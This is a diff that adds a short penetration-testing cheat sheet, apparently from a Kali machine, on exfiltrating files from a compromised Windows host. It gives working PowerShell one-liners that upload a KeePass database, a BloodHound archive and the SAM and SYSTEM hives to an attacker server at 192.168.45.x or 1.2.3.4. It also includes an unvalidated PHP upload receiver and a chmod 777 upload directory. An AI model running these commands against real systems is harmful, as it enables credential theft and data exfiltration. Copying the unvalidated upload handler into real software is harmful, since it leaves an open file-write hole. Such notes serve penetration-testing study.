@@ -1,1 +1,27 @@
+Powershell file upload
+Use powershell to exfiltrate files
+start apache
+sudo systemctl start apache2     
+(kali㉿kali)-[/var/www/html/uploads]                           
 
+
+Then from the remote system:
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.x/upload.php', 'Database.kdbx')                  
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.x/upload.php', '20231017210514_BloodHound.zip')        
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.x/upload.php', 'SAM')        
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.x/upload.php', 'SYSTEM.tar')        
+
+
+// windows uploads using windows scripting languages
+cat /var/www/html/upload.php
+<?
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+sudo mkdir /var/www/uploads
+sudo chmod 777 /var/www/uploads/
+sudo chown www-data: /var/www/uploads
+
+powershell (New-Object System.Net.Webclient).UploadFile('http://1.2.3.4/upload.php','file.exe')
